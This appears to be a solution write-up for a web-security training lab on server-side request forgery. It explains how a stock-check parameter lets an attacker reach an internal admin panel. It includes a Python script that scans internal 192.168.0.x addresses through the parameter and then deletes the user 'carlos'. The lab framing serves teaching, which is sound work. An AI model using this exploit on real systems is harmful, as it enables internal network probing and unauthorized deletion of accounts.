2. Basic SSRF against another back-end system</a>

Server-side request forgery (SSRF) - we coerce the server into making a request
on our behalf to some endpoint. The endpoint will receive the request from the
server, not us, therefore we can abuse existing trust relationships between the
server and the target endpoint.

In this case, the server uses a stock API to check to see if an item is in
stock. How the server makes this request is transparent to the user - a POST
request is sent to the server with the API frontend URL contained in the
paramter "stockApi". The server proceeds to make a GET request to this stock
API.

We know that the admin endpoint is located at a different backend server inside
the private network where the website resides - 192.168.0.x. To delete the user
"carlos", we have to brute-force the location of the backend server, using SSRF
to make requests to different IP addresses and inspecting the response to
determine when we find the correct backend endpoint.

Once we find the backend endpoint, we make our request to the /product/stock
endpoint on the server, with the stockApi parameter set to
"http://192.168.0.x/admin/delete?username=carlos". The website server proceeds
to initiate a GET request to the backend server, allowing us to abuse the
existing trust relationship and delete the user "carlos".

Solution:

```python
# usage:
# python3 3.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str) -> None:
        self.url = url.rstrip("/")
        self.who = who

    def solve(self) -> None:
        self.s = requests.Session()

        for i in range(2, 255):
            r = self.s.post(
                f"{self.url}/product/stock",
                data={"stockApi": f"http://192.168.0.{i}:8080/admin"},
            )

            error = re.findall(r"Internal Server Error", r.text)
            if not error:
                break

        self.s.post(
                f"{self.url}/product/stock",
                data={"stockApi": f"http://192.168.0.{i}:8080/admin/delete?username={self.who}"},
            )


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    s = Solution(args.url, args.who)
    s.solve()


if __name__ == "__main__":
    main()
```
